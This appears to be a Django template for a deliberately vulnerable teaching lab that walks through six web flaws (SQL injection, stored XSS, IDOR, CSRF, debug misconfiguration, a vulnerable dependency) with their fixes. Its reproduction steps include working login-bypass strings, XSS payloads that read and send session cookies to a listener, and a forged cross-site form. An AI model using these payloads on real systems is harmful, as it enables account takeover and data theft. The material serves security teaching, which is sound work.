@@ -1,0 +1,431 @@
+{% extends "forum/base.html" %}
+{% block title %}Demos{% endblock %}
+{% block content %}
+
+<h1>The six demos</h1>
+
+<p>
+  This app is a teaching lab. It contains real, working versions of six common
+  web vulnerabilities, and next to each one it contains the fix. A single
+  switch decides which version runs:
+</p>
+
+<pre><code># vulnerable (the default)
+python manage.py runserver
+
+# fixed
+SECURE_MODE=1 python manage.py runserver</code></pre>
+
+<p>
+  The recipe for every demo is the same: <strong>perform the attack in
+  vulnerable mode, then restart the server in secure mode and perform exactly
+  the same attack again.</strong> Nothing changes except which side of an
+  <code>if</code> statement runs.
+</p>
+
+<div class="note">
+  <strong>The point of the whole lab.</strong> Django is secure by default.
+  Almost none of these bugs are things Django left for you to fix - they are
+  protections Django already gave you that the vulnerable code has to
+  deliberately switch off. Every time you read the source, look for the comment
+  marked <code>BYPASS:</code>. That line is the bug.
+</div>
+
+<p class="muted">
+  Currently running in
+  {% if secure_mode %}<strong>secure</strong>{% else %}<strong>vulnerable</strong>{% endif %}
+  mode.
+  Demo accounts: <code>alice / alice123</code>, <code>bob / bob123</code>,
+  <code>carol / carol123</code>, teacher <code>prof / prof123</code>.
+</p>
+
+{% if request.GET.reset %}
+  <div class="note good">Database reset. All four demo accounts are back to their starting state.</div>
+{% endif %}
+
+
+<!-- ================================================================= -->
+<h2 id="sqli">1. SQL injection on the login form</h2>
+
+<p>
+  A web application talks to its database by sending it sentences written in
+  SQL. If the application builds those sentences by gluing your typing directly
+  into the middle of the string, then your typing is not just data any more -
+  it becomes part of the sentence. A single apostrophe closes the quoted value
+  early, and everything you type after it is read by the database as
+  instructions. The classic payload <code>' OR '1'='1' --</code> closes the
+  username string, adds a condition that is always true, and comments out the
+  rest of the query - including the part that checks the password. The
+  vulnerable login here queries a "legacy accounts" table that stores passwords
+  in plain text, which is what makes the result so damaging: the attacker gets
+  in, and the whole password list is one query away.
+</p>
+
+<h3>Steps to reproduce <span class="tag vuln">vulnerable mode</span></h3>
+<ol class="steps">
+  <li>Make sure you are logged out, then go to <a href="{% url 'login' %}">/login/</a>.</li>
+  <li>In <strong>Username</strong> type exactly: <code>' OR '1'='1' --</code>
+      (apostrophe, space, OR, space, apostrophe, 1, apostrophe, equals,
+      apostrophe, 1, apostrophe, space, two hyphens).</li>
+  <li>In <strong>Password</strong> type anything at all, for example <code>x</code>.</li>
+  <li>Press <strong>Log in</strong>. You are now signed in as <code>prof</code>,
+      the teacher - the first row in the table - without knowing any password.</li>
+  <li>Check the banner in the top-right of the page: it says you are the teacher.
+      Visit <a href="{% url 'course_grades' 1 %}">/courses/1/grades/</a> to see
+      what that account can reach.</li>
+  <li>Log out, and try to target a specific victim instead: username
+      <code>alice' --</code> with any password. The <code>--</code> comments out
+      the password check, so you log in as Alice.</li>
+  <li>Go back to the login page after a failed attempt - it prints the exact SQL
+      that ran, so you can see your apostrophe breaking the query in half.</li>
+</ol>
+
+<h3>What the fix does <span class="tag fix">secure mode</span></h3>
+<p>
+  The secure branch does not build SQL at all. It calls Django's
+  <code>authenticate()</code>, which looks the user up through the ORM. The ORM
+  sends the query template and the values to the database as two separate
+  things (a <em>parameterised</em> query), so the database always knows which
+  bytes are instructions and which are data. Your apostrophes are just
+  characters in a username that does not exist. It also compares your password
+  against a salted PBKDF2 hash rather than a plain-text column, so even a full
+  database dump does not hand over anyone's password.
+</p>
+<p class="note good">
+  <strong>Django already prevented this.</strong>
+  <code>LegacyAccount.objects.filter(username=u, password=p)</code> would have
+  been immune with no effort at all. Writing the insecure version took
+  <em>more</em> work than writing the secure one: we had to reach past the ORM
+  for <code>connection.cursor()</code> and hand-build the string. If you ever
+  find yourself doing that, stop.
+</p>
+
+
+<!-- ================================================================= -->
+<h2 id="xss">2. Stored cross-site scripting (XSS) in forum posts</h2>
+
+<p>
+  A browser cannot tell the difference between JavaScript the site's authors
+  wrote and JavaScript that arrived in the middle of a forum post - it is all
+  just text in the same HTML document, and it all runs with the same powers.
+  <em>Stored</em> XSS means the attacker's script is saved in the database once
+  and then served to everybody who opens that page, over and over, for as long
+  as the post exists. One student posting one reply gets their code running in
+  the browser of every classmate and of the teacher, inside their session, able
+  to read the page, read the cookies, and send requests as them. This is why
+  the vulnerability is far more serious than an alert box makes it look.
+</p>
+
+<h3>Steps to reproduce <span class="tag vuln">vulnerable mode</span></h3>
+<ol class="steps">
+  <li>Log in as <code>bob / bob123</code>.</li>
+  <li>Open a thread, for example
+      <a href="{% url 'thread_detail' 1 %}">Welcome to CS340</a>.</li>
+  <li>In the reply box, post this and submit:
+      <br><code>&lt;script&gt;alert('XSS by ' + document.title)&lt;/script&gt;</code></li>
+  <li>The alert fires immediately - but that is not the demo. Log out, log back
+      in as <code>alice / alice123</code>, and open the same thread. It fires for
+      her too. It will fire for everyone, every time, until the post is deleted.</li>
+  <li>Now show why it matters. Post a second reply:
+      <br><code>&lt;script&gt;alert('Session cookie: ' + document.cookie)&lt;/script&gt;</code>
+      <br>The session id is displayed. Anyone who copies that value into their
+      own browser is logged in as the victim, without ever knowing the password.</li>
+  <li>Optional, more realistic: start a second server in another terminal with
+      <code>python -m http.server 9000</code>, then post
+      <br><code>&lt;script&gt;fetch('http://127.0.0.1:9000/stolen?c='+document.cookie)&lt;/script&gt;</code>
+      <br>and watch the cookie appear in that terminal's access log. This is
+      what real cookie theft looks like - silent, with no alert box.</li>
+  <li>Payloads do not need <code>&lt;script&gt;</code> tags. Try
+      <code>&lt;img src=x onerror="alert(1)"&gt;</code> - filters that only look
+      for the word "script" miss this one.</li>
+</ol>
+
+<h3>What the fix does <span class="tag fix">secure mode</span></h3>
+<p>
+  Three separate layers, each of which would have been enough on its own:
+</p>
+<ul>
+  <li><strong>Output escaping.</strong> The template drops the
+      <code>|safe</code> filter, so Django's automatic escaping turns
+      <code>&lt;</code> into <code>&amp;lt;</code>. The payload is displayed as
+      text instead of being run. Note that we escape on the way <em>out</em>,
+      not on the way in - the same stored text might later go into an email or
+      a JSON API, where the dangerous characters are different ones.</li>
+  <li><strong>HttpOnly cookies.</strong> <code>SESSION_COOKIE_HTTPONLY = True</code>
+      makes the session cookie invisible to <code>document.cookie</code>, so even
+      a successful injection cannot steal the session. Repeat step 5 in secure
+      mode: the session id is gone from the output.</li>
+  <li><strong>Content-Security-Policy.</strong> A middleware adds
+      <code>script-src 'self'</code>, which tells the browser to run scripts only
+      if they came from this site's own URLs. Inline scripts - which is exactly
+      what an injected payload is - are refused. Open the developer console in
+      secure mode and you will see the browser report the blocked script.</li>
+</ul>
+<p class="note good">
+  <strong>Django already prevented this.</strong> Auto-escaping is on by
+  default in every Django template. The vulnerable version exists only because
+  somebody typed <code>|safe</code> (or called <code>mark_safe()</code>), which
+  is a promise to Django that the string is trustworthy HTML. Never make that
+  promise about anything a user typed. And note that we had to
+  <em>un-set</em> <code>SESSION_COOKIE_HTTPONLY</code>, because Django turns it
+  on for you.
+</p>
+
+
+<!-- ================================================================= -->
+<h2 id="idor">3. Insecure direct object reference (IDOR)</h2>
+
+<p>
+  Most web pages identify the thing they are showing you with a number in the
+  URL: <code>/messages/3/</code>. That number is a <em>direct reference</em> to a
+  row in a database table, and it is trivially guessable - if there is a
+  message 3 there is probably a message 2. The vulnerability appears when the
+  application checks that you are logged in, and then forgets to check that the
+  thing you asked for is actually yours. Being <em>authenticated</em> (the app
+  knows who you are) is not the same as being <em>authorised</em> (you are
+  allowed to see this particular row), and no framework can guess the second
+  one for you.
+</p>
+
+<h3>Steps to reproduce <span class="tag vuln">vulnerable mode</span></h3>
+<ol class="steps">
+  <li>Log in as <code>alice / alice123</code>.</li>
+  <li>Go to <a href="{% url 'inbox' %}">/messages/</a>. Alice has one message,
+      number 4, from the professor. Open it and look at the URL.</li>
+  <li>Edit the URL by hand: change it to
+      <a href="/messages/2/">/messages/2/</a>. You are now reading a private
+      message between Bob and Carol that Alice was never meant to see.</li>
+  <li>Try <code>/messages/1/</code> and <code>/messages/3/</code> too. An
+      attacker would simply write a loop over every number and download the
+      whole message table.</li>
+</ol>
+
+<h3>Variant 3b: the same bug, about roles</h3>
+<p>
+  The second version of this mistake is a page that is only meant for one kind
+  of user, protected by nothing but the fact that no link points to it. That is
+  "security through obscurity", and it is not security - a URL is not a secret.
+</p>
+<ol class="steps">
+  <li>Still logged in as the student Alice, visit
+      <a href="{% url 'course_grades' 1 %}">/courses/1/grades/</a>.</li>
+  <li>There is no link to this page anywhere in the student interface, but it
+      opens anyway: you are looking at the whole class's grades, including
+      Bob's failing mark and the professor's private comment about it.</li>
+</ol>
+
+<h3>What the fix does <span class="tag fix">secure mode</span></h3>
+<p>
+  For the messages, the ownership test becomes part of the lookup itself: the
+  view asks for "this message, if I am its sender or its recipient", and
+  answers <code>403 Forbidden</code> otherwise. For the grades page, the view
+  checks two things - that the user's role is teacher, <em>and</em> that they
+  are the teacher of this specific course. Repeat both attacks in secure mode
+  and you get 403 instead of somebody else's data.
+</p>
+<p class="note good">
+  <strong>What Django gives you and what it does not.</strong>
+  <code>@login_required</code> is built in and answers "who are you?". Django
+  also ships <code>@permission_required</code> and
+  <code>@user_passes_test</code> for role checks. But the question "does this
+  row belong to this person?" depends entirely on what your application means,
+  so it is the one piece of security you always have to write yourself. Make it
+  part of the query, not an afterthought - a filter you forget to add fails
+  open, and nobody notices until it is on the news.
+</p>
+
+
+<!-- ================================================================= -->
+<h2 id="csrf">4. Cross-site request forgery (CSRF)</h2>
+
+<p>
+  Your browser attaches your cookies for a site to <em>every</em> request that
+  goes to that site - it does not care which page started the request. So if
+  you are logged into this forum in one tab, and you open an attacker's page in
+  another tab, that page can quietly make your browser submit a form to the
+  forum, and the forum will see a perfectly ordinary, fully logged-in request
+  from you. The attacker never sees the response and never steals your cookie;
+  they do not need to. They just need your browser to perform one action on
+  your behalf - change your email address, and then use "forgot password" to
+  take the account. Django's defence is a secret token in every form, which the
+  attacker's page cannot read because the browser's same-origin policy forbids
+  reading another site's HTML.
+</p>
+
+<h3>Steps to reproduce <span class="tag vuln">vulnerable mode</span></h3>
+<ol class="steps">
+  <li>Log in as <code>carol / carol123</code> and visit
+      <a href="{% url 'profile' %}">/profile/</a>. Note the current email
+      address, <code>carol@example.edu</code>.</li>
+  <li>In a second terminal, serve the attacker's page from a different origin:
+      <pre><code>cd attacker
+python -m http.server 9000</code></pre></li>
+  <li>In the same browser, still logged in, open
+      <a href="http://127.0.0.1:9000/attacker.html">http://127.0.0.1:9000/attacker.html</a>.
+      It looks like a harmless page about free exam papers.</li>
+  <li>It contains a hidden form that submits itself to
+      <code>http://127.0.0.1:8000/profile/</code>. Come back to
+      <a href="{% url 'profile' %}">/profile/</a> and reload: Carol's email is
+      now <code>attacker@evil.example</code>.</li>
+  <li>Carol clicked nothing. She visited one page on a completely different
+      site.</li>
+</ol>
+
+<h3>What the fix does <span class="tag fix">secure mode</span></h3>
+<p>
+  The <code>@csrf_exempt</code> decorator stops applying, so Django checks every
+  POST again: the request must carry the secret token that the real form
+  embedded, and its <code>Origin</code> header must belong to this site. The
+  attacker's page can make your browser send a request, but it cannot read the
+  token out of the real form, so its forged POST gets
+  <code>403 Forbidden</code>. Repeat the attack in secure mode and the
+  attacker's page shows Django's 403 page instead of a silent success.
+</p>
+<p class="note good">
+  <strong>Django already prevented this.</strong> The CSRF middleware is in
+  <code>MIDDLEWARE</code> from the moment you run
+  <code>django-admin startproject</code>, and it protects every POST view
+  automatically. The only way to get this bug is to type
+  <code>@csrf_exempt</code>. It exists for a genuine reason - webhook endpoints
+  that authenticate by signature instead of cookies - but on a normal,
+  cookie-authenticated form it is simply a hole.
+</p>
+<p class="note">
+  <strong>Notice what the template does.</strong>
+  <code>{% templatetag openblock %} csrf_token {% templatetag closeblock %}</code>
+  is present in <code>profile.html</code> in <em>both</em> modes. In vulnerable
+  mode the page dutifully renders a perfect token that the server never looks
+  at. Security is enforced by the check, not by the token.
+</p>
+<p class="muted">
+  If the attack does not work, your browser may be defending you: modern
+  browsers refuse to attach cookies to cross-<em>site</em> requests by default.
+  The attacker page is served from the same host on a different port, which
+  counts as the same site, so it should work everywhere - but this is worth
+  knowing, and it is a good example of defence in depth. See the README.
+</p>
+
+
+<!-- ================================================================= -->
+<h2 id="misconfig">5. Security misconfiguration</h2>
+
+<p>
+  Most of the settings that keep a Django site safe are already correct when
+  you generate the project - the danger is the handful you have to change
+  before you deploy and might forget. The famous one is <code>DEBUG</code>. With
+  <code>DEBUG = True</code>, any unhandled error returns a page containing the
+  full stack trace, the value of every local variable at the moment of the
+  crash, your installed apps, your URL map, the request headers and a dump of
+  your settings. On your laptop that is a gift. On a public server it is a free
+  map of your application, handed to anyone who can make it crash.
+</p>
+
+<h3>Steps to reproduce <span class="tag vuln">vulnerable mode</span></h3>
+<ol class="steps">
+  <li>Open <a href="{% url 'misconfig' %}">/misconfig/</a> and press
+      <strong>Trigger an unhandled error</strong>.</li>
+  <li>Scroll through the yellow page. Under "Local vars" you will find
+      <code>secret_api_key</code> and <code>database_password</code> printed in
+      full - variables the programmer never intended anyone to see.</li>
+  <li>Keep scrolling to the bottom for the settings dump and the complete list
+      of installed applications and middleware, which tells an attacker exactly
+      which libraries and versions to look up.</li>
+  <li>Visit a URL that does not exist, such as <code>/nope/</code>. Django's
+      404 page in debug mode prints your entire URL configuration.</li>
+  <li>Now run the deployment checker in a terminal:
+      <pre><code>python manage.py check --deploy</code></pre>
+      and read the warnings.</li>
+</ol>
+
+<h3>What the fix does <span class="tag fix">secure mode</span></h3>
+<p>
+  <code>DEBUG = False</code>. Errors return a plain
+  <code>Server Error (500)</code>, and the traceback goes to the server log
+  where only the operators can read it. Turning it off also starts enforcing
+  <code>ALLOWED_HOSTS</code>, which blocks Host-header attacks. Run
+  <code>SECURE_MODE=1 python manage.py check --deploy</code> and compare the
+  much shorter list of warnings (eight drop to five).
+</p>
+<p class="note good">
+  <strong>You do not have to remember this list.</strong>
+  <code>manage.py check --deploy</code> reads your settings and tells you what
+  is wrong. Run it in CI and treat its output as errors. A few warnings survive
+  even in secure mode here: the HTTPS-only ones
+  (<code>SECURE_SSL_REDIRECT</code>, <code>SECURE_HSTS_SECONDS</code>,
+  <code>SESSION_COOKIE_SECURE</code>, <code>CSRF_COOKIE_SECURE</code>) because
+  the lab runs over plain HTTP on localhost, and the <code>SECRET_KEY</code>
+  one because we hard-coded an insecure key. A real HTTPS deployment must clear
+  all of them.
+</p>
+
+
+<!-- ================================================================= -->
+<h2 id="deps">6. Using a component with a known vulnerability</h2>
+
+<p>
+  Your application is not just the code you wrote. A typical Django project
+  installs dozens of packages, each of which installs more, and any one of them
+  can turn out to have a security flaw that was published months ago and fixed
+  in a version you never upgraded to. You will not find these by reading your
+  own code, because the bug is not in your code - the only way to find them is
+  to compare your installed versions against a database of published
+  vulnerabilities, automatically, on a schedule.
+</p>
+
+<h3>Steps to reproduce</h3>
+<p>
+  <code>requirements.txt</code> deliberately pins <code>PyYAML==5.3.1</code>,
+  a real release with a published arbitrary-code-execution CVE
+  (CVE-2020-14343). Nothing in this app imports it - it is there purely so the
+  scanner has something true to report.
+</p>
+<ol class="steps">
+  <li><pre><code>pip install pip-audit
+pip-audit -r requirements.txt</code></pre></li>
+  <li>Read the output: each row names the package, the version you have, the
+      vulnerability identifier, and - most usefully - the version that fixes it.</li>
+  <li>Look one of the identifiers up on
+      <code>https://osv.dev</code> to see what the flaw actually was.</li>
+  <li>Unpin the version, reinstall, and run the scan again to watch the finding
+      disappear.</li>
+</ol>
+
+<h3>What the fix does</h3>
+<p>
+  Upgrading is the entire fix. The lesson is about process rather than code:
+  keep a lock file so you know exactly what you are running, run a scanner in
+  your continuous integration so a new advisory fails the build rather than
+  waiting to be noticed, and treat "our dependency has a CVE" as a bug with an
+  owner and a deadline. We are not exploiting this one - the point is that the
+  scan output is real.
+</p>
+
+
+<!-- ================================================================= -->
+<h2>Reset the lab</h2>
+<p>
+  Wipes the database and recreates the four demo accounts, the courses, the
+  threads and the private messages - useful after a class has filled the forum
+  with XSS payloads. Everyone is logged out.
+</p>
+<form method="post" action="{% url 'reset_demo' %}">
+  {% csrf_token %}
+  <button type="submit" class="danger">Reset the demo database</button>
+</form>
+<p class="muted">
+  The same thing from a terminal: <code>python manage.py reset_demo</code>
+</p>
+
+<div class="note bad">
+  <strong>A reminder about the law.</strong> Everything on this page is legal
+  and useful <em>here</em>, because this application exists to be attacked and
+  runs on your own machine. Running the same techniques against a system you do
+  not own and do not have written permission to test is a criminal offence in
+  most countries - in the UK the Computer Misuse Act 1990, in the US the
+  Computer Fraud and Abuse Act, and equivalents elsewhere. "I was only curious"
+  and "I did not break anything" are not defences. If you want more practice,
+  use a lab that is meant for it: PortSwigger Web Security Academy, OWASP
+  Juice Shop, or Hack The Box.
+</div>
+
+{% endblock %}
